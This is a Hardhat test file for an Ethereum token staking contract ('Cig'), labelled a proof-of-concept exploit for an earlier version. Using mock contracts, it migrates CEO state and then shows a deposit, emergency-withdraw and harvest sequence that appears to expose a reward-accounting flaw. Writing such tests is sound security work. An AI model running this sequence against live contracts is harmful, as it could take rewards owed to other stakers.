/**
 * PoC exploit for previous contract
 */
const {expect} = require("chai");
const {ContractFactory, utils, BigNumber} = require('ethers');

describe("NewCig", function () {
    let CigToken;
    let cig;
    let cigToken;
    let PunkMock;
    let pm;
    let owner, simp, elizabeth;
    let PoolMock;
    let pt;
    let NFTMock;
    let nft, oldNft;
    let V2RouterMock;
    let v2;
    let oldcig;
    const BLOCK_REWARD = '5';
    const CEO_EPOCH_BLOCKS = 1;
    const CEO_AUCTION_BLOCKS = 5;
    let CEO_BUY_PRICE = '1';
    let CLAIM_AMOUNT = '100000';
    let MINT_SUPPLY = (parseInt(CLAIM_AMOUNT) * 10000) + '';
    let graffiti = "hello world";
    let graff32 = new Uint8Array(32);
    let feth = utils.formatEther;
    let peth = utils.parseEther;
    let ASSET_URL = "ipfs://2727838744/something/238374/";
    //let MSV2 = '0xEF0881eC094552b2e128Cf945EF17a6752B4Ec5d'; //
    let MSV2_mock, mcv2;
    before(async function () {
        [owner, simp, elizabeth] = await ethers.getSigners();

        // deploy the punks mocking contract
        V2RouterMock = await ethers.getContractFactory("V2RouterMock");
        v2 = await V2RouterMock.deploy();
        await v2.deployed();

        PunkMock = await ethers.getContractFactory("PunkMock");
        pm = await PunkMock.deploy(owner.address);
        await pm.deployed();

        // deploy the pool mocking contract
        PoolMock = await ethers.getContractFactory("PoolTokenMock");
        pt = await PoolMock.deploy(owner.address);
        await pt.deployed();
        for (let i = 0; i < graffiti.length; i++) {
            graff32[i] = graffiti.charCodeAt(i);
        }

        // Masterchef v2 mock
        MSV2_mock = await ethers.getContractFactory("MasterChefV2");
        mcv2 = await MSV2_mock.deploy();

        // Deploy the old contract
        NFTMock = await ethers.getContractFactory("NonFungibleCEO");
        oldNft = await NFTMock.deploy(ASSET_URL);
        await oldNft.deployed();

        OldCigToken = await ethers.getContractFactory("OldCig");
        oldcig = await OldCigToken.deploy(
            1,
            utils.parseEther(BLOCK_REWARD),
            pm.address,
            CEO_EPOCH_BLOCKS,
            CEO_AUCTION_BLOCKS,
            utils.parseEther(CEO_BUY_PRICE),
            mcv2.address,
            graff32,
            oldNft.address,
            v2.address
        );
        await oldcig.deployed();

        await oldNft.setCigToken(oldcig.address);

        CigToken = await ethers.getContractFactory("Cig");
        cigToken = await CigToken.deploy(
            utils.parseEther(BLOCK_REWARD),
            "0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb",
            //pm.address,
            CEO_EPOCH_BLOCKS,
            CEO_AUCTION_BLOCKS,
            utils.parseEther(CEO_BUY_PRICE),
            graff32,
            oldNft.address,
            v2.address,
            oldcig.address,
            1,
            mcv2.address

        );
        await cigToken.deployed();

        mcv2.setRewarder(cigToken.address); // Add CIG to shushi rewards

    });

    describe("Harvest", function () {



        it("Should be able to claim harvest", async function () {
            // set the pool
            await cigToken.setPool(pt.address);
            await pt.mint(simp.address, peth("10")); // give 10 LP tokens to simp
            await pt.mint(elizabeth.address, peth("5")); // give 5 to beth
            await pt.mint(owner.address, peth("11")); // give 5 to beth
            expect(await pt.approve(cigToken.address, peth("100000000"))).to.emit(pt, "Approval");
            expect(await pt.approve(mcv2.address, peth("100000000"))).to.emit(pt, "Approval");
            expect(await pt.connect(simp).approve(cigToken.address, peth("100000000"))).to.emit(pt, "Approval");
            expect(await pt.connect(simp).approve(mcv2.address, peth("100000000"))).to.emit(pt, "Approval");

            // claim
            //await oldcig.claim(4513);
            // we need to claim a punk and buy CEO so that it is in state 1
            await oldcig.claim(4513);
            let graff32 = new Uint8Array(32);
            let graffiti = "hello world";
            for (let i = 0; i < graffiti.length; i++) {
                graff32[i] = graffiti.charCodeAt(i);
            }
            await oldcig.buyCEO(peth("101"), peth("1"), peth("100"), 4513, graff32);

            await oldNft.setCigToken(cigToken.address); // so that we can migrate

            await cigToken.migrationComplete(); // rewards should be 512 per block

            [info] = await cigToken.getStats(owner.address);
            expect(info[0]).to.be.equal(1); // CEO state

            // owner deposits to sushi
            expect(await mcv2.deposit(owner.address, utils.parseEther('5')))
                .to.emit(cigToken, 'ChefDeposit').withArgs(owner.address, peth('5'));
            // owner deposits to cig
            expect(await cigToken.deposit(utils.parseEther('11'))).to.emit(pt, 'Transfer').withArgs(owner.address, cigToken.address, peth('11'));
            let [,total] = await cigToken.userInfo(0, owner.address);
            expect(total).to.be.equal(peth("16"));

            // simp deposits to sushi
            expect(await mcv2.connect(simp).deposit(simp.address, utils.parseEther('1')))
                .to.emit(cigToken, 'ChefDeposit').withArgs(simp.address, peth('1'));
            // simp deposits to cig

            console.log("simp pt bal:"+ feth(await pt.balanceOf(simp.address)));

            expect(await cigToken.connect(simp).deposit(utils.parseEther('3'))).to.emit(pt, 'Transfer').withArgs(simp.address, cigToken.address, peth('3'));

            // owner does a harvest
//return

            expect(await cigToken.harvest())
                .to.emit(cigToken, "Transfer").withArgs(cigToken.address, owner.address, peth("964.894117647053"));


            // simp does emergency withdraw
            expect(await cigToken.connect(simp).emergencyWithdraw()).to.emit(cigToken, "EmergencyWithdraw").withArgs(simp.address, peth("3"));

            // simp should be able to harvest through mc
            expect(await mcv2.connect(simp).harvest()).to.emit(cigToken, "Harvest"); // fails here




        });

    });

});